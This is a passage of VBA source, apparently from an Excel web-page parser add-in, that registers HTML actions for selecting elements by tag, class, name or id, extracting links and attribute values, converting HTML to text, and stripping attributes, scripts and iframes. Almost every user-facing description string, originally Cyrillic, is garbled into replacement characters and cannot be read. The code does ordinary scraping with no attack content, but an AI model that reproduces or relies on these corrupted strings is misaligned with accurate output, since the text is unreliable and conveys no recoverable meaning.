                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| outerHTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| | |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, even|odd)"
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| SPAN)", TAGS_ARRAY, "div"
        .AddParameter "ClassName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Source", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("outerHTML", "innerHTML"), "outerHTML"
    End With

    With AAs.AddAction(fc_UNUSED, "GetElementsByTagNameAndName", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| name)" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Name)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| outerHTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| SPAN)", TAGS_ARRAY, "div"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Name)"
        .AddParameter "Source", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("outerHTML", "innerHTML"), "outerHTML"
    End With

    With AAs.AddAction(fc_UNUSED, "GetElementsByTagName", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| outerHTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| SPAN)", TAGS_ARRAY, "div"
        .AddParameter "Source", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("outerHTML", "innerHTML"), "outerHTML"
    End With

    With AAs.AddAction(fc_UNUSED, "GetElementById", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| ID |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ID)" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ID)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| outerHTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "ID", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ID)"
        .AddParameter "Source", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("outerHTML", "innerHTML"), "outerHTML"
    End With


    With AAs.AddAction(fc_UNUSED, "GetAllLinks", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| /programmes/Parser, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
                       "http://excelvba.ru/programmes/Parser, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) http://excelvba.ru"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Prefix", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, http://site.ru)"
    End With

    With AAs.AddAction(fc_UNUSED, "GetAttributeValue", "# HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, ""input""), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""name"" |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""status"")," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "<input type=""text"" class=""width-100 valid"" name=""phone"" id=""phone"" value=""89004591553"" title=""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"">" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 89004591553 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| value)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: ""input"", ""name"", ""phone"", ""value"""

        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, INPUT, SELECT |fffd||fffd||fffd| META)", Array("input", "select", "meta"), "input"
        .AddParameter "CheckAttrName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("id", "name", "class", "title", "type", "itemprop"), "id"
        .AddParameter "CheckAttrValue", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "AttrName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("value", "title", "content"), "value"
    End With

    With AAs.AddAction(fc_UNUSED, "HTML2TXT", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|" & vbNewLine & _
                       "<A href=""http://ExcelVBA.ru/help"">|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|</A>" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_HTML, "HTML_DeleteSpaces", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
    End With

    With AAs.AddAction(fc_HTML, "HTML_DeleteAttributes", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|" & vbNewLine & _
                       "<th id=""row1"" class=""label"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><td class=""data"">ARAL</td>" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| <th>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><td>ARAL</td>"
    End With

    With AAs.AddAction(fc_UNUSED, "RemoveElementsByTagNameAndClassName", "# HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| | |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, even|odd)"
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| SPAN)", TAGS_ARRAY, "div"
        .AddParameter "ClassName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_UNUSED, "RemoveElementsByTagName", "# HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)."
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| SPAN)", TAGS_ARRAY, "div"
    End With

    With AAs.AddAction(fc_HTML, "QuickRemoveTags", "HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <script>...</script> |fffd||fffd| HTML |fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd||fffd| Windows (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, SCRIPT |fffd||fffd||fffd| IFRAME)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| script|iframe|strong)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <!--|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-->, |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| comments."
        .AddParameter "TagName", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, script|iframe)", Array("script", "script|iframe", "comments"), "script|iframe"
    End With


    With AAs.AddAction(fc_UNUSED, "GetPropertyByItemprop", "# HTML: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| itemprop |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
